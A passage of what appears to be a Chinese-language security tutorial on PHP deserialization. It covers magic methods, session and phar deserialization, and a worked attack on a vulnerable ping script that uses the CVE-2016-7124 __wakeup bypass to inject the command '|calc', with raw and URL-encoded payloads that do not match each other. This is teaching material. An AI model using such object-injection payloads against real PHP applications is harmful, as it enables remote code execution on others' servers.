class="token double-quoted-string string">"&lt;class name&gt;"</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>n<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>field name <span class="token number">1</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>field value1<span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>field name n<span class="token operator">&gt;</span><span class="token operator">&lt;</span>field value n<span class="token operator">&gt;</span><span class="token punctuation">}</span><span class="token constant">N</span> <span class="token operator">-</span> <span class="token constant">null</span><span class="token constant">R</span> <span class="token operator">-</span> pointer reference<span class="token constant">U</span> <span class="token operator">-</span> unicode string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">h3</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token operator">=</span><span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v3</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v4</span><span class="token operator">=</span><span class="token number">2.1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v5</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v6</span><span class="token operator">=</span><span class="token double-quoted-string string">"h3h3QAQ"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$v7</span><span class="token operator">=</span><span class="token double-quoted-string string">"H3h3QAQ"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$v8</span><span class="token operator">=</span><span class="token double-quoted-string string">"protected"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">h3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化运行结果为：</p><pre class="line-numbers language-none"><code class="language-none">O:2:"h3":8:{s:2:"v1";N;s:2:"v2";b:0;s:2:"v3";i:1;s:2:"v4";d:2.1;s:2:"v5";a:0:{}s:2:"v6";s:7:"h3h3QAQ";s:6:" h3 v7";s:7:"H3h3QAQ";s:5:" * v8";s:9:"protected";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反序列化运行结果</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">object</span><span class="token punctuation">(</span>h3<span class="token punctuation">)</span><span class="token shell-comment comment">#1 (8) {</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v1"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v2"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean constant">false</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v3"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v4"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">float</span><span class="token punctuation">(</span><span class="token number">2.1</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v5"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">}</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v6"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"h3h3QAQ"</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v7"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"h3"</span><span class="token punctuation">:</span><span class="token keyword">private</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"H3h3QAQ"</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v8"</span><span class="token punctuation">:</span><span class="token keyword">protected</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"protected"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（1）各种魔术方法"><a href="#（1）各种魔术方法" class="headerlink" title="（1）各种魔术方法"></a>（1）各种魔术方法</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment">//析构函数当对象被销毁时会被自动调用</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//unserialize()时会被自动调用</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatci</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于从不可访问的属性读取数据</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//把类当作字符串使用时触发</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124）</p><h4 id="（2）PHP反序列化特性"><a href="#（2）PHP反序列化特性" class="headerlink" title="（2）PHP反序列化特性"></a>（2）PHP反序列化特性</h4><p>1.PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>}</code>作为结尾（字符串除外），并且是根据长度判断内容的。</p><p>2.在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。</p><p>3.对类中不存在的属性也会进行反序列化。</p><h3 id="2-session反序列化"><a href="#2-session反序列化" class="headerlink" title="2.session反序列化"></a><strong>2.session反序列化</strong></h3><h4 id="（1）session概念"><a href="#（1）session概念" class="headerlink" title="（1）session概念"></a>（1）session概念</h4><p>PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。</p><h4 id="（2）会话过程"><a href="#（2）会话过程" class="headerlink" title="（2）会话过程"></a>（2）会话过程</h4><p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中。当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。</p><p>默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数<code>session_start()</code>来手动开始一个会话。如果配置项<code>session.auto_start</code>设置为1，那么请求开始的时候，会话会自动开始</p><p>PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数<code>session_write_close()</code>来手动关闭会话</p><h4 id="（3）存储引擎"><a href="#（3）存储引擎" class="headerlink" title="（3）存储引擎"></a>（3）存储引擎</h4><p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式储存。储存的文件是以<code>sess_PHPSESSID</code>来进行命名的，文件的内容就是session值得序列化之后得内容。</p><p><code>session.serialize_handler</code>有如下三种取值：</p><p><img src="https://i.loli.net/2021/08/24/yTPxw3vL9GoS7A5.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">in_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.serialize_handeler'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php_binary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里可以换不同的存储引擎</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每种存储引擎存储的内容格式：</p><p><img src="https://i.loli.net/2021/08/24/2qIVl4jeL6mwSMg.png"></p><h3 id="3-phar反序列化"><a href="#3-phar反序列化" class="headerlink" title="3.phar反序列化"></a>3.phar反序列化</h3><p>phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞</p><p>phar文件的结构：</p><pre class="line-numbers language-none"><code class="language-none">-stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件-manifest：压缩文件的属性等信息，以序列化的形式储存自定义的meat-data，这里就是漏洞利用的关键点-contents：压缩文件的内容-signature：签名，在文件末尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>生成phar文件</p><pre class="line-numbers language-none"><code class="language-none">一定要将php.ini中的phar.readonly选项设置为Off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">h3</span><span class="token punctuation">{</span><span class="token punctuation">}</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GIF89a"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;?php__HALT_COMPILER();?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub，添加gif文件头</span><span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">h3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将自定义meat-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##二、反序列化漏洞</p><h3 id="1-反序列化成因"><a href="#1-反序列化成因" class="headerlink" title="1.反序列化成因"></a>1.反序列化成因</h3><p>主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作</p><h4 id="（1）phar反序列化漏洞造成原因"><a href="#（1）phar反序列化漏洞造成原因" class="headerlink" title="（1）phar反序列化漏洞造成原因"></a>（1）phar反序列化漏洞造成原因</h4><p>漏洞出发点在使用<code>phar://</code>协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞</p><h3 id="2-反序列化漏洞"><a href="#2-反序列化漏洞" class="headerlink" title="2.反序列化漏洞"></a>2.反序列化漏洞</h3><h4 id="（1）PHP反序列化漏洞"><a href="#（1）PHP反序列化漏洞" class="headerlink" title="（1）PHP反序列化漏洞"></a>（1）PHP反序列化漏洞</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exam_day1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -C 2 <span class="token interpolation"><span class="token variable">$host</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以简单的分析一下代码</p><p>定义了一个<code>class</code>类，类中有两个私有变量<code>method</code>和<code>args</code></p><p>有三个魔术方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>  <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//析构函数当对象被销毁时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//unserialize()时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析代码段中<code>host</code>的来源，想办法利用<code>system()</code>构成RCE</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exam_day1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//析构函数当对象被销毁时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -C 2 <span class="token interpolation"><span class="token variable">$host</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//unserialize()时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们观察代码可知：</p><p><code>GET</code>方法获取参数a，并且将其反序列化。</p><p>但是再执行反序列化的时候，会自动调用<code>__wakeup()</code>魔术方法，把<code>args</code>的值改为<code>127.0.0.1</code></p><p>无论我们怎么构造payload，<code>system()</code>执行的命令都是<code>ping -c 2 127.0.0.1</code></p><p>这时我们可以利用到<code>CVE-2016-7124</code>漏洞</p><blockquote><p>适用版本：</p><p>PHP5&lt;5.6.25、PHP7&lt;7.0.1</p><p>当成员属性数目大于实际数码时可绕过__wakeup方法</p></blockquote><p>就可以构造恶意payload来RCE</p><p>这里还有个小知识点<code>|</code>管道符</p><pre class="line-numbers language-none"><code class="language-none">把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/xMTGeRKUBzPyNmA.png"></p><p>所以我们可以构造序列化了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"|calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">O:4:"home":2:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要跳一下<code>__wakeup()</code>把成员属性数目改为3</p><pre class="line-numbers language-none"><code class="language-none">O:4:"home":3:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URL编码一下</p><pre class="line-numbers language-none"><code class="language-none">O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/olTV4wmYSr956LB.png"></p><p>成功RCE</p><h4 id="（2）session反序列化漏洞"><a href="#（2）session反序列化漏洞" class="headerlink" 